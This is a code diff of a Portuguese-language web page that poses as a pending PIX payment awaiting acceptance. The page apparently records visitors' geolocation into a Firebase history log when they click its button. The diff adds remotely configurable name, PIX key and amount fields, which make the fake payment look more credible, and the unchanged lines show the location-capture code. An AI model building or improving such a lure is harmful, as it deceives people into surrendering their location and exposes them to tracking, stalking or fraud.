@@ -64,10 +64,11 @@
       justify-content: space-between;
       font-size: 13px;
       margin-bottom: 10px;
+      gap: 10px;
     }
     .info-row:last-child { margin-bottom: 0; }
-    .info-label { color: #6b7280; }
-    .info-value { font-weight: 600; color: #111827; }
+    .info-label { color: #6b7280; white-space: nowrap; }
+    .info-value { font-weight: 600; color: #111827; text-align: right; word-break: break-all; }
     .info-value.amount { color: #059669; font-weight: 700; font-size: 14px; }
 
     button {
@@ -140,12 +141,20 @@
         <span class="info-value">PIX Instantâneo</span>
       </div>
       <div class="info-row">
+        <span class="info-label">Nome</span>
+        <span class="info-value" id="infoNome">Carregando...</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Chave PIX</span>
+        <span class="info-value" id="infoChave">Carregando...</span>
+      </div>
+      <div class="info-row">
         <span class="info-label">Status</span>
         <span class="info-value" style="color: #d97706;">Aguardando aceite</span>
       </div>
       <div class="info-row">
         <span class="info-label">Valor</span>
-        <span class="info-value amount">R$ ***,**</span>
+        <span class="info-value amount" id="infoValor">R$ ***,**</span>
       </div>
     </div>
 
@@ -159,7 +168,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+    import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCWmb-8mTJcIJNWyisaS1qfeSDs1irw9IU",
@@ -175,6 +184,16 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
+    // Atualiza os dados da tela em tempo real
+    onValue(ref(db, 'config/pix'), (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        if (data.nome) document.getElementById('infoNome').innerText = data.nome;
+        if (data.chave) document.getElementById('infoChave').innerText = data.chave;
+        if (data.valor) document.getElementById('infoValor').innerText = data.valor;
+      }
+    });
+
     const btn = document.getElementById('btnEnviar');
     const status = document.getElementById('status');
 
@@ -187,7 +206,6 @@
         (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           
-          // Usa push para registrar em um histórico
           push(ref(db, 'localizacao/historico'), {
             lat: latitude,
             lng: longitude,
